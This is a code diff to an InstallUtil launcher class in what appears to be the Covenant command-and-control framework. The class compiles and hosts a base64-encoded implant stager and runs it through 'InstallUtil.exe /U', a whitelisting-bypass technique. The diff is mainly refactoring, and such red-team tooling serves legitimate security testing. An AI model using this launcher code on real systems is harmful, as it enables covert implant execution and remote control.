@@ -21,12 +21,13 @@ namespace Covenant.Models.Launchers
             this.Type = LauncherType.InstallUtil;
             this.Description = "Uses installutil.exe to start a Grunt via Uninstall method.";
             this.OutputKind = OutputKind.WindowsApplication;
+            this.CompressStager = true;
         }
 
-        public override string GetLauncher(Listener listener, Grunt grunt, HttpProfile profile, ImplantTemplate template)
+        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
-            this.StagerCode = listener.GetGruntStagerCode(grunt, profile, template);
-            this.Base64ILByteString = listener.CompileGruntStagerCode(grunt, profile, template, this.OutputKind, true);
+            this.StagerCode = StagerCode;
+            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
             string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
 
             List<Compiler.Reference> references = grunt.DotNetFrameworkVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
@@ -39,7 +40,7 @@ namespace Covenant.Models.Launchers
             });
             this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CompilationRequest
             {
-                Language = grunt.Language,
+                Language = template.Language,
                 Source = code,
                 TargetDotNetVersion = grunt.DotNetFrameworkVersion,
                 OutputKind = OutputKind.DynamicallyLinkedLibrary,
@@ -55,14 +56,14 @@ namespace Covenant.Models.Launchers
             HttpListener httpListener = (HttpListener)listener;
             if (httpListener != null)
             {
-                Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
+                Uri hostedLocation = new Uri(httpListener.Urls + hostedFile.Path);
                 this.LauncherString = "InstallUtil.exe" + " " + "/U" + " " + hostedFile.Path.Split('/').Last();
                 return hostedLocation.ToString();
             }
             else { return ""; }
         }
 
-        private static string CodeTemplate =
+        private static readonly string CodeTemplate =
 @"using System;
 class Program
 {
